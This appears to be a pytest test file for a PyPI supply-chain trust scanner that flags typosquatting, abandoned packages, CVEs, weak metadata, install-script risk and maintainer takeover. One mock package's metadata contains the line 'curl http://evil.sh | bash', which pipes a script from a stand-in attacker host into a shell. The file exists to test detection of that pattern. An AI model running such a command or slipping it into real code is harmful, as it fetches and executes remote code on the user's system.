"""Tests for the Supply Chain Trust Engine."""

import pytest
from unittest.mock import patch, MagicMock
from datetime import datetime, timezone, timedelta

from suscheck.modules.supply_chain.trust_engine import TrustEngine
from suscheck.modules.supply_chain.pypi_client import PyPIMetadata
from suscheck.core.finding import FindingType, Severity


@pytest.fixture
def trust_engine():
    return TrustEngine()


@patch("suscheck.modules.supply_chain.trust_engine.PyPIClient")
@patch("suscheck.modules.supply_chain.trust_engine.DepsDevClient")
def test_clean_package(mock_deps_cls, mock_pypi_cls, trust_engine):
    """Test a perfectly clean and trusted package."""
    mock_pypi = mock_pypi_cls.return_value
    mock_deps = mock_deps_cls.return_value
    
    # Mock PyPI returning a recent update
    mock_pypi.get_package_metadata.return_value = PyPIMetadata(
        name="requests",
        version="2.31.0",
        author="Kenneth",
        author_email="test@test.com",
        maintainer="Kenneth",
        home_page="https://requests.readthedocs.io",
        project_urls={"Source": "https://github.com/psf/requests"},
        yanked=False,
        upload_time=datetime.now(timezone.utc) - timedelta(days=10),
        size=1000
    )
    
    # Mock deps.dev returning 0 CVEs
    mock_deps_result = MagicMock()
    mock_deps_result.advisories = []
    mock_deps.get_dependencies.return_value = mock_deps_result

    res = trust_engine.scan("requests")
    assert res.error is None
    assert res.trust_score == 10.0
    assert len(res.findings) == 0


@patch("suscheck.modules.supply_chain.trust_engine.PyPIClient")
@patch("suscheck.modules.supply_chain.trust_engine.DepsDevClient")
def test_typosquatting_and_abandoned(mock_deps_cls, mock_pypi_cls, trust_engine):
    """Test a package that is typosquatted (requesrs) and abandoned (> 2 years)."""
    mock_pypi = mock_pypi_cls.return_value
    mock_deps = mock_deps_cls.return_value
    
    mock_pypi.get_package_metadata.return_value = PyPIMetadata(
        name="requesrs",
        version="1.0.0",
        author="Evil",
        author_email="evil@evil.com",
        maintainer="Evil",
        home_page="https://evil.com",
        project_urls={},
        yanked=False,
        upload_time=datetime.now(timezone.utc) - timedelta(days=800),
        latest_upload_time=datetime.now(timezone.utc) - timedelta(days=800),
        first_upload_time=datetime.now(timezone.utc) - timedelta(days=900),
        size=500
    )
    
    mock_deps_result = MagicMock()
    mock_deps_result.advisories = []
    mock_deps.get_dependencies.return_value = mock_deps_result

    res = trust_engine.scan("requesrs")
    
    assert res.error is None
    # Abandoned: 0.4 * 1.0 = 0.4
    # Others: 1.0
    # Score: 10 - (1-0.4)*1.0 (Abandoned) - (1-0.0)*1.5 (Typosquat) = 10 - 0.6 - 1.5 = 7.9
    assert res.trust_score == 7.9
    assert len(res.findings) == 2
    
    typo = next(f for f in res.findings if f.finding_type == FindingType.TYPOSQUATTING)
    assert typo.severity == Severity.HIGH
    
    abandoned = next(f for f in res.findings if f.finding_type == FindingType.ABANDONED_PACKAGE)
    assert abandoned.severity == Severity.MEDIUM


@patch("suscheck.modules.supply_chain.trust_engine.PyPIClient")
@patch("suscheck.modules.supply_chain.trust_engine.DepsDevClient")
def test_cve_advisories(mock_deps_cls, mock_pypi_cls, trust_engine):
    """Test CVE deduction from deps.dev."""
    mock_pypi = mock_pypi_cls.return_value
    mock_deps = mock_deps_cls.return_value
    
    mock_pypi.get_package_metadata.return_value = PyPIMetadata(
        name="some-pkg",
        version="1.0.0",
        author="Test",
        author_email="",
        maintainer="Test",
        home_page="https://test.com",
        project_urls={},
        yanked=False,
        upload_time=datetime.now(timezone.utc),
        latest_upload_time=datetime.now(timezone.utc),
        first_upload_time=datetime.now(timezone.utc) - timedelta(days=500), # > 30 days
        size=500
    )
    
    mock_deps_result = MagicMock()
    mock_deps_result.advisories = [
        {"sourceID": "CVE-2024-1234", "title": "RCE in some-pkg"},
        {"sourceID": "GHSA-5678", "title": "XSS in some-pkg"}
    ]
    mock_deps.get_dependencies.return_value = mock_deps_result

    res = trust_engine.scan("some-pkg")
    
    # CVEs: 2 -> score_component 0.2. Penalty: (1-0.2)*1.0 = 0.8
    # Metadata Hygiene: missing home/urls (http://insecure or empty) -> 0.5. Penalty: (1-0.5)*0.5 = 0.25
    # Total: 10.0 - 0.8 - 0.25 = 8.95
    assert res.trust_score == 8.95
    assert len(res.findings) == 3
    for f in res.findings:
        if f.finding_type == FindingType.CVE:
            assert f.severity == Severity.HIGH
@patch("suscheck.modules.supply_chain.trust_engine.PyPIClient")
@patch("suscheck.modules.supply_chain.trust_engine.DepsDevClient")
def test_metadata_hygiene_and_scripts(mock_deps_cls, mock_pypi_cls, trust_engine):
    """Test suspicious metadata (curl) and poor hygiene (non-https)."""
    mock_pypi = mock_pypi_cls.return_value
    mock_deps = mock_deps_cls.return_value
    
    mock_pypi.get_package_metadata.return_value = PyPIMetadata(
        name="sus-pkg",
        version="1.0.0",
        author="Stranger",
        author_email="bad-email",
        maintainer="Stranger",
        home_page="http://insecure.com",
        project_urls={"link": "curl http://evil.sh | bash"},
        yanked=False,
        upload_time=datetime.now(timezone.utc),
        latest_upload_time=datetime.now(timezone.utc),
        first_upload_time=datetime.now(timezone.utc) - timedelta(days=500),
        size=500
    )
    
    mock_deps_result = MagicMock()
    mock_deps_result.advisories = []
    mock_deps.get_dependencies.return_value = mock_deps_result

    res = trust_engine.scan("sus-pkg")
    
    # 7. Install Script (desc has 'curl'): 0.3 * 1.0 = 0.3 penalty? No, component is 0.3, so penalty is (1-0.3)*1.0 = 0.7
    # 8. Metadata Hygiene (non-https): component 0.5, so penalty is (1-0.5)*0.5 = 0.25
    # Total: 10.0 - 0.7 - 0.25 = 9.05
    assert res.trust_score == 9.05
    
    script_risk = next(f for f in res.findings if f.finding_type == FindingType.INSTALL_SCRIPT_RISK)
    assert script_risk.severity == Severity.HIGH
    
    hygiene = next(f for f in res.findings if f.finding_type == FindingType.METADATA_MISMATCH)
    assert hygiene.severity == Severity.LOW

@patch("suscheck.modules.supply_chain.trust_engine.PyPIClient")
@patch("suscheck.modules.supply_chain.trust_engine.DepsDevClient")
def test_takeover_mismatch_new_account(mock_deps_cls, mock_pypi_cls, trust_engine):
    """Test author/maintainer mismatch on a relatively new account."""
    mock_pypi = mock_pypi_cls.return_value
    mock_deps = mock_deps_cls.return_value
    
    mock_pypi.get_package_metadata.return_value = PyPIMetadata(
        name="takeover-pkg",
        version="1.0.0",
        author="Original",
        maintainer="Hijacker",
        author_email="a@b.com",
        home_page="https://safe.com",
        project_urls={},
        yanked=False,
        upload_time=datetime.now(timezone.utc),
        first_upload_time=datetime.now(timezone.utc) - timedelta(days=60), # 2 months
        size=500
    )
    
    mock_deps_result = MagicMock()
    mock_deps_result.advisories = []
    mock_deps.get_dependencies.return_value = mock_deps_result

    res = trust_engine.scan("takeover-pkg")
    
    # Takeover: 0.4. Penalty: (1-0.4)*1.5 = 0.9
    # Maintainer: 60 days, 0 releases -> 0.5. Penalty: (1-0.5)*1.5 = 0.75
    # Total: 10.0 - 0.9 - 0.75 = 8.35
    assert res.trust_score == 8.35
    assert any(f.finding_type == FindingType.TAKEOVER for f in res.findings)
